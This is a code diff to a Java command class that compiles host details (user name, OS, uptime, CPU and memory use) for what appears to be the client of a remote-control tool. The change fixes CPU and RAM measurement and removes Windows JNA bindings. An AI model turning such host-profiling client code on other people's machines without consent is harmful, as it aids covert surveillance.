@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.info;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 import com.github.sarxos.webcam.Webcam;
 import com.sun.jna.Native;
 import com.sun.jna.Structure;
@@ -39,18 +39,21 @@ public class ClientCommandInfo extends ClientCommand {
             SystemInfo si = new SystemInfo();
             OperatingSystem os = si.getOperatingSystem();
             stringBuilder.append(os.getFamily()).append(" ").append(os.getVersionInfo().getVersion()).append(" (").append(os.getManufacturer()).append(")");
-            stringBuilder.append("\nPasta atual: ").append(new File(FileComponents.FOLDER).getAbsolutePath());
+            stringBuilder.append("\nPasta atual: ").append(new File(ClientFileComponents.FOLDER).getAbsolutePath());
             stringBuilder.append("\nProcessos: ").append(os.getProcessCount()).append(" - Sessões: ").append(os.getSessions().size());
-            stringBuilder.append("\nBoot: ").append(FileComponents.toDate(os.getSystemBootTime() * 1000L)).append(" - ").append(FileComponents.toTime(os.getSystemUptime()));
+            stringBuilder.append("\nBoot: ").append(ClientFileComponents.toDate(os.getSystemBootTime() * 1000L)).append(" - ").append(ClientFileComponents.toTime(os.getSystemUptime()));
 
             String processorName = getProcessorName();
-            double cpuUsage = getCPUUsage();
             CentralProcessor cpu = si.getHardware().getProcessor();
+            long[] oldTicks = cpu.getSystemCpuLoadTicks();
+            try { Thread.sleep(500); } catch (Exception ignored) {}
+            double cpuUsage = cpu.getSystemCpuLoadBetweenTicks(oldTicks) * 100.0;
             stringBuilder.append("\nProcessador: ").append(processorName).append(" (").append(String.format("%.2f", cpuUsage)).append("%) | ").append(cpu.getPhysicalProcessorCount()).append("/").append(cpu.getLogicalProcessorCount()).append(" | ").append(FormatUtil.formatHertz(cpu.getMaxFreq()));
 
             GlobalMemory memory = si.getHardware().getMemory();
             java.util.List<PhysicalMemory> physicalMemories = si.getHardware().getMemory().getPhysicalMemory();
-            stringBuilder.append("\nMemória: ").append(FormatUtil.formatBytes(memory.getTotal() - memory.getAvailable())).append(" / ").append(FormatUtil.formatBytes(memory.getTotal())).append(" (").append(physicalMemories.size()).append(")\n - ");
+            double ramUsagePercent = ((double) (memory.getTotal() - memory.getAvailable()) / memory.getTotal()) * 100.0;
+            stringBuilder.append("\nMemória: ").append(FormatUtil.formatBytes(memory.getTotal() - memory.getAvailable())).append(" / ").append(FormatUtil.formatBytes(memory.getTotal())).append(" (").append(String.format("%.2f", ramUsagePercent)).append("%) (").append(physicalMemories.size()).append(")\n - ");
             for (PhysicalMemory physicalMemory : physicalMemories) {
                 stringBuilder.append(FormatUtil.formatBytes(physicalMemory.getCapacity())).append(" (").append(physicalMemory.getMemoryType()).append(") ");
             }
@@ -96,7 +99,7 @@ public class ClientCommandInfo extends ClientCommand {
     public String getPCInfoSimple() {
         StringBuilder sb = new StringBuilder();
         sb.append("> Cliente: ").append(System.getProperty("user.name")).append("\n");
-        sb.append("Pasta atual: ").append(new File(FileComponents.FOLDER).getAbsolutePath()).append("\n");
+        sb.append("Pasta atual: ").append(new File(ClientFileComponents.FOLDER).getAbsolutePath()).append("\n");
         sb.append("Sistema Operacional: ")
                 .append(System.getProperty("os.name")).append(" ")
                 .append(System.getProperty("os.version")).append(" (")
@@ -113,54 +116,7 @@ public class ClientCommandInfo extends ClientCommand {
         return sb.toString();
     }
 
-    public interface Kernel32 extends StdCallLibrary {
-        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);
 
-        WinNT.HANDLE GetCurrentProcess();
-    }
-
-    public interface Psapi extends StdCallLibrary {
-        Psapi INSTANCE = Native.load("psapi", Psapi.class);
-
-        int GetPerformanceInfo(PERFORMANCE_INFORMATION pPerformanceInformation, int cb);
-    }
-
-    public static class PERFORMANCE_INFORMATION extends Structure {
-        public int cb;
-        public long CommitTotal;
-        public long CommitLimit;
-        public long CommitPeak;
-        public long PhysicalTotal;
-        public long PhysicalAvailable;
-        public long SystemCache;
-        public long KernelTotal;
-        public long KernelPaged;
-        public long KernelNonpaged;
-        public long PageSize;
-        public long HandleCount;
-        public long ProcessCount;
-        public long ThreadCount;
-
-        @Override
-        protected List<String> getFieldOrder() {
-            return Arrays.asList(
-                    "cb",
-                    "CommitTotal",
-                    "CommitLimit",
-                    "CommitPeak",
-                    "PhysicalTotal",
-                    "PhysicalAvailable",
-                    "SystemCache",
-                    "KernelTotal",
-                    "KernelPaged",
-                    "KernelNonpaged",
-                    "PageSize",
-                    "HandleCount",
-                    "ProcessCount",
-                    "ThreadCount"
-            );
-        }
-    }
 
     public static String getProcessorName() {
         return Advapi32Util.registryGetStringValue(
@@ -170,19 +126,6 @@ public class ClientCommandInfo extends ClientCommand {
         );
     }
 
-    public static double getCPUUsage() {
-        Kernel32 kernel32 = Kernel32.INSTANCE;
-        Psapi psapi = Psapi.INSTANCE;
 
-        WinNT.HANDLE handle = kernel32.GetCurrentProcess();
-        PERFORMANCE_INFORMATION perfInfo = new PERFORMANCE_INFORMATION();
-        if (psapi.GetPerformanceInfo(perfInfo, perfInfo.size()) == 0) {
-            throw new RuntimeException("Falha ao obter informações de desempenho");
-        }
-
-        long totalPhysicalMemory = perfInfo.PhysicalTotal * perfInfo.PageSize;
-        long availablePhysicalMemory = perfInfo.PhysicalAvailable * perfInfo.PageSize;
-        return ((double) (totalPhysicalMemory - availablePhysicalMemory) / totalPhysicalMemory) * 100;
-    }
 
 }
